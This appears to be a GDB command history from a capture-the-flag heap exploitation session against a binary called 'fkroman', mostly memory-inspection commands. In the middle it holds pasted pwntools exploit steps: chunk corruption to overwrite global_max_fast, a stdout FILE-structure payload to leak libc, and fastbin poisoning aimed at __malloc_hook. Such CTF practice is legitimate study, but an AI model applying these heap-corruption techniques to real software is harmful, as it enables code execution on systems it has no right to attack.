p global_max_fast 
c
p global_max_fast 
c
x /20gx 0x0000555555554000+0x4060
x /20gx 0x0000555555559140
p main_arena .fastbinsY 
p main_arena 
x /20gx 0x0000555555559130
c
x /20gx 0x0000555555559130
x /20gx 0x0000555555554000+0x4060
c
x /20gx 0x0000555555554000+0x4060
c
p global_max_fast 
p main_arena
x /20gx 0x0000555555554000+0x4060
x /20gx 0x0000555555559140
x /20gx 0x0000555555554000+0x4060
x /20gx 0x0000555555559140
x /20gx 0x00007ffff7dd25cf
x /20gx 0x00007ffff7dd25cf
x /20gx 0x0000555555559130
c
x /20gx 0x0000555555559130
x /20gx 0x0000555555554000+0x4060
c
x /20gx 0x0000555555554000+0x4060
x /20gx 0x00007ffff7dd25df
c
x /20gx 0x0000555555554000+0x4060
x /20gx 0x00007ffff7dd25df
c
vmmap
x /20gx 0x0000555555554000+0x4060
x /20gx 0x00007ffff7dd25df
c
vmmap
p &__free_hook 
x /20gx 0x7ffff7dd37a8
x /20gx 0x7ffff7dd3798
x /20gx 0x7ffff7dd3788
x /20gx 0x7ffff7dd3778
x /20gx 0x7ffff7dd3768
x /20gx 0x7ffff7dd3738
x /20gx 0x7ffff7dd3708
x /20gx 0x7ffff7dd26af
c
x /20gx 0x0000555555554000+0x4060
c
c
x /20gx 0x0000555555554000+0x4060
x /20gx 0x0000555555554000+0x4060
c
x /20gx 0x0000555555554000+0x4060
x /20gx 0x0000555555559410
x /20gx 0x0000555555559230
c
c
x /20gx 0x0000555555554000+0x4060
x /20gx 0x0000555555559230
x /20gx 0x0000555555559320
c
x /20gx 0x0000555555559320
p main_arena 
c
x /20gx 0x0000555555554000+0x4060
c
x /20gx 0x0000555555554000+0x4060
x /20gx 0x00007ffff7dd26bf
x /80gx 0x00007ffff7dd26bf
x /80gx 0x00007ffff7dd26c0
x /20gx 0x0000555555554000+0x4060
ni
c
p &__malloc_hook
x /20gx 0x7ffff7dd1b10
x /20gx 0x7ffff7dd1a10
x /20gx 0x7ffff7dd1ac0
x /20gx 0x7ffff7dd1abc
x /20gx 0x7ffff7dd1adc
x /20gx 0x7ffff7dd1adc
x /20gx 0x7ffff7dd1ada
x /20gx 0x7ffff7dd1adc
x /20gx 0x7ffff7dd1add
x /20gx 0x7ffff7dd1aed
c
vmmap
 x /20gx 0x0000555555554000+0x4080
 x /20gx 0x0000555555554000+0x4070
 x /20gx 0x0000555555554000+0x4060
c
 x /20gx 0x0000555555554000+0x4060
x /20gx 0x00007ffff7dd1afd
x /20gx 0x00007ffff7dd1b00
c
x /20gx 0x00007ffff7dd1b00
c
c
p &__malloc_hook 
x /20gx p = process("./fkroman")
x /20gx 0x7ffff7dd1b10
x /20gx 0x7ffff7dd1b00
vmmap
x /20gx 0x0000555555554000+0x4060
x /20gx p = process("./fkroman")
add(0,0x10)
add(1,0xe0)
add(2,0x10)
add(3,0xe0)
add(4,0xe0)
add(5,0xe0)
add(9,0xe0)
add(10,0x68)
free(1)
edit(1,10,"a"*8+"\xe8\x37\n")
#modify global_max_fast
p.sendline("")
add(6,0xe0)
free(3)
edit(3,2,"\xcf\x25\n")
p.sendline("")
add(7,0xe0)
add(7,0xe0)
payload = "a"+p64(0)*7+p64(0xf1)+p64(0xfbad1887)+p64(0)*3+"\x00"+"\n"
edit(7,len(payload),payload)
libc_base = u64(p.recvuntil("\xff\x7f").ljust(8,"\x00"))-0x7ffff7a89b00+0x00007ffff7a0d000
p.sendline("")
p.recv()
p.recv()
p.sendline("")
p.recv()
p.sendline("3")
p.recv()
p.sendline("5")
free(10)
edit(10,8,p64(libc_base -0x7ffff7a89b00 + 0x7ffff7dd1aed))
p.sendline("")
p.recv()
x /20gx 0x0000555555559500
x /20gx 0x0000555555554000+0x4060
x /20gx 0x0000555555559500
vmmap
r
vmmap
p &__free_hook 
x /20gx 0x7ffff7dd37a8
x /20gx 0x7ffff7dd3708
x /90gx 0x7ffff7dd3708
r
p &malloc__hook
p &__malloc_hook 
x /20gx  &__malloc_hook 
x /20gx  &__malloc_hook -0x10
x /20gx  0x7ffff7dd1b00
x /20gx 0x00007ffff7a92a00
x /20i 0x00007ffff7a92a00
vmmap
x 0x0000555555554000+0x4060
x /20gx  0x0000555555554000+0x4060
x /20gx  0x0000555555554000+0x4060
x /20gx 0x0000555555559010
p main_arena .fastbinsY 
x /20gx  0x0000555555554000+0x4060
p main_arena .fastbinsY 
x /20gx 0x555555559120
c+
c
x /20gx 0x555555559120
c
c
p main_arena .fastbinsY 
c
bt
p main_arena .fastbinsY 
p main_arena .fastbinsY 
x /20gx 0x555555559120
c
c
p main_arena .fastbinsY 
c
p main_arena.fastbinsY 
x /20gx 0x555555559120
x /20gx 0x0000555555559000
x /20gx  0x0000555555554000+0x4060
x /20gx 0x00007ffff7dd25ed
x /20gx 0x00007ffff7dd25f0
x /20gx  0x0000555555554000+0x4060
x /20gx 0x7ffff7dd2608
x /20gx 0x7ffff7dd2610
x /20gx 0x7ffff7dd2615
x /20gx 0x7ffff7dd2605
x /20gx 0x7ffff7dd25dd
x /20gx 0x7ffff7dd25e0
x /20gx 0x7ffff7dd25ed
x /20gx 0x7ffff7dd25f0
p &stdout
p  *(struct _IO_FILE **) 0x7ffff7dd2708
p  **(struct _IO_FILE **) 0x7ffff7dd2708
c
p  **(struct _IO_FILE **) 0x7ffff7dd2708
c
vmmap
p &__malloc_hook
x /20gx 0x7ffff7dd1b10
x /20gx 0x7ffff7dd1b00
x /20gx 0x7ffff7dd1abc
x /20gx 0x7ffff7dd1abd
x /20gx 0x7ffff7dd1aed
x /20gx 0x7ffff7dd1af0
p __malloc_hook 
c
p __malloc_hook 
x /20gx  0x0000555555554000+0x4060
x /40gx 0x00007ffff7dd1afd
x /40gx 0x00007ffff7dd1b00
x /20gx  0x0000555555554000+0x4060
x /20gx  0x0000555555554000+0x4060
r
x stdout
x /20gx 0x7ffff7dd2620
 
x /20gx 0x7f[3~ff7dd2500
x /20gx 0x7ffff7dd2505
x /20gx 0x7ffff7dd251d
p &stdout
p stdout
x /80gx 0x7ffff7dd25a0
x /20gx 0x7ffff7dd2610
x /20gx 0x7ffff7dd2614
x /20gx 0x7ffff7dd2600
x /20gx 0x7ffff7dd2610
x /20gx 0x7ffff7dd2615
x /20gx 0x7ffff7dd2610
x /20gx 0x7ffff7dd2615
x /20gx 0x7ffff7dd2610
x /20gx 0x7ffff7dd260b
x /20gx 0x7ffff7dd2610
x /20gx 0x7ffff7dd260f
x /20gx 0x7ffff7dd2610
x /20gx 0x7ffff7dd2611
x /20gx 0x7ffff7dd2612
x /20gx 0x7ffff7dd2613
x /20gx 0x7ffff7dd2610
x /20gx 0x7ffff7dd2600
x /20gx 0x7ffff7dd25f0
x /20gx 0x7ffff7dd25e0
x /20gx 0x7ffff7dd25df
x /20gx 0x7ffff7dd25de
x /20gx 0x7ffff7dd25dd
x /20gx 0x7ffff7dd25de
x /20gx 0x7ffff7dd25dd
vmmap
c
c
